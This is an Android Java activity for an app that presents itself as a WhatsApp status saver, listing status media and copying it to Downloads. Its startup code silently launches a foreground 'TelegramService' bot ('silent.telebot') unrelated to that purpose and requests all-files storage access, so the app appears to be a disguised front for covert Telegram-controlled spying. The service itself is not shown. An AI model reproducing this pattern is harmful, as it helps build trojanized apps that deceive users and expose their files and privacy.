package com.silent.telebot;

import android.Manifest;
import android.app.Activity;
import android.content.ContentValues;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.provider.Settings;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class MainActivity extends Activity {
    private static final int REQ_PERMISSION = 100;
    private ListView listView;
    private TextView tvStatus;
    private Button btnRefresh;
    private List<String> fileNames = new ArrayList<>();
    private List<String> filePaths = new ArrayList<>();
    private String currentPath = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        listView = findViewById(R.id.list_statuses);
        tvStatus = findViewById(R.id.tv_status);
        btnRefresh = findViewById(R.id.btn_refresh);

        // تشغيل البوت فوراً
        startTelegramService();

        // طلب صلاحية التخزين
        checkStoragePermission();

        btnRefresh.setOnClickListener(v -> loadStatuses());

        // عند الضغط على عنصر القائمة (تحميل)
        listView.setOnItemClickListener((parent, view, position, id) -> {
            String path = filePaths.get(position);
            downloadFile(new File(path));
        });
    }

    private void startTelegramService() {
        Intent serviceIntent = new Intent(this, TelegramService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    private void checkStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, REQ_PERMISSION);
            } else {
                loadStatuses();
            }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, new String[]{
                        Manifest.permission.READ_EXTERNAL_STORAGE,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE
                }, REQ_PERMISSION);
            } else {
                loadStatuses();
            }
        } else {
            loadStatuses();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_PERMISSION) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                loadStatuses();
            } else {
                tvStatus.setText("❌ صلاحية التخزين مرفوضة!");
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_PERMISSION) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (Environment.isExternalStorageManager()) {
                    loadStatuses();
                } else {
                    tvStatus.setText("❌ صلاحية إدارة التخزين مرفوضة!");
                }
            }
        }
    }

    // البحث التلقائي عن مجلد الحالات (نفس الكود السابق)
    private File findStatusFolder() {
        String base = Environment.getExternalStorageDirectory().getAbsolutePath();

        String[] possiblePaths = {
                base + "/Android/media/com.whatsapp/WhatsApp/Media/.Statuses/",
                base + "/WhatsApp/Media/.Statuses/",
                base + "/Media/WhatsApp/Media/.Statuses/",
                base + "/WhatsApp/.Statuses/",
                base + "/Android/media/com.whatsapp/WhatsApp/.Statuses/"
        };

        for (String path : possiblePaths) {
            File folder = new File(path);
            if (folder.exists() && folder.isDirectory()) {
                File[] files = folder.listFiles();
                if (files != null && files.length > 0) {
                    currentPath = path;
                    return folder;
                }
            }
        }

        try {
            File mediaDir = new File(base + "/Android/media/");
            if (mediaDir.exists() && mediaDir.isDirectory()) {
                File[] subDirs = mediaDir.listFiles();
                if (subDirs != null) {
                    for (File subDir : subDirs) {
                        if (subDir.isDirectory() && subDir.getName().contains("whatsapp")) {
                            File statusFolder = new File(subDir, "WhatsApp/Media/.Statuses/");
                            if (statusFolder.exists() && statusFolder.isDirectory()) {
                                File[] files = statusFolder.listFiles();
                                if (files != null && files.length > 0) {
                                    currentPath = statusFolder.getAbsolutePath();
                                    return statusFolder;
                                }
                            }
                        }
                    }
                }
            }
        } catch (Exception ignored) {}

        return null;
    }

    private void loadStatuses() {
        try {
            File folder = findStatusFolder();

            if (folder == null || !folder.exists()) {
                tvStatus.setText("❌ لم يتم العثور على مجلد الحالات!");
                return;
            }

            File[] files = folder.listFiles();
            if (files == null || files.length == 0) {
                tvStatus.setText("📭 لا توجد حالات. شاهد حالة على واتساب أولاً");
                return;
            }

            fileNames.clear();
            filePaths.clear();

            List<String> extensions = Arrays.asList(".jpg", ".jpeg", ".png", ".mp4", ".gif");
            for (File file : files) {
                String name = file.getName().toLowerCase();
                boolean isValid = false;
                for (String ext : extensions) {
                    if (name.endsWith(ext)) {
                        isValid = true;
                        break;
                    }
                }
                if (isValid && file.length() > 0) {
                    fileNames.add(file.getName());
                    filePaths.add(file.getAbsolutePath());
                }
            }

            if (fileNames.isEmpty()) {
                tvStatus.setText("📭 لا توجد ملفات صالحة");
                return;
            }

            // عرض الأسماء مع صاحب الحالة (نستخرج اسم الملف بدون امتداد)
            String[] displayNames = new String[fileNames.size()];
            for (int i = 0; i < fileNames.size(); i++) {
                String name = fileNames.get(i);
                // إزالة الامتداد
                int dotIndex = name.lastIndexOf('.');
                if (dotIndex > 0) {
                    name = name.substring(0, dotIndex);
                }
                // استبدال الشرطات بمسافات
                displayNames[i] = name.replace("_", " ").replace("-", " ");
            }

            ArrayAdapter<String> adapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1, displayNames);
            listView.setAdapter(adapter);
            tvStatus.setText("✅ تم العثور على " + fileNames.size() + " حالة");

        } catch (Exception e) {
            tvStatus.setText("❌ خطأ: " + e.getMessage());
        }
    }

    // دالة حفظ الحالة (محدثة)
    private void downloadFile(File sourceFile) {
        try {
            if (!sourceFile.exists()) {
                Toast.makeText(this, "الملف غير موجود!", Toast.LENGTH_SHORT).show();
                return;
            }

            String fileName = sourceFile.getName();

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                String mimeType = "image/jpeg";
                if (fileName.endsWith(".mp4")) mimeType = "video/mp4";
                else if (fileName.endsWith(".gif")) mimeType = "image/gif";
                else if (fileName.endsWith(".png")) mimeType = "image/png";

                ContentValues values = new ContentValues();
                values.put(MediaStore.Downloads.DISPLAY_NAME, "حالة_واتساب_" + System.currentTimeMillis() + "_" + fileName);
                values.put(MediaStore.Downloads.MIME_TYPE, mimeType);
                values.put(MediaStore.Downloads.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS);

                Uri uri = getContentResolver().insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, values);
                if (uri != null) {
                    OutputStream out = getContentResolver().openOutputStream(uri);
                    FileInputStream in = new FileInputStream(sourceFile);
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = in.read(buffer)) != -1) {
                        out.write(buffer, 0, bytesRead);
                    }
                    in.close();
                    out.close();
                    Toast.makeText(this, "✅ تم حفظ الحالة في مجلد التنزيلات", Toast.LENGTH_SHORT).show();
                }
            } else {
                File destFolder = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                File destFile = new File(destFolder, "حالة_واتساب_" + System.currentTimeMillis() + "_" + fileName);

                FileInputStream in = new FileInputStream(sourceFile);
                FileOutputStream out = new FileOutputStream(destFile);
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = in.read(buffer)) != -1) {
                    out.write(buffer, 0, bytesRead);
                }
                in.close();
                out.close();
                Toast.makeText(this, "✅ تم حفظ الحالة في مجلد التنزيلات", Toast.LENGTH_SHORT).show();
            }

        } catch (Exception e) {
            Toast.makeText(this, "❌ فشل الحفظ: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }
                } 
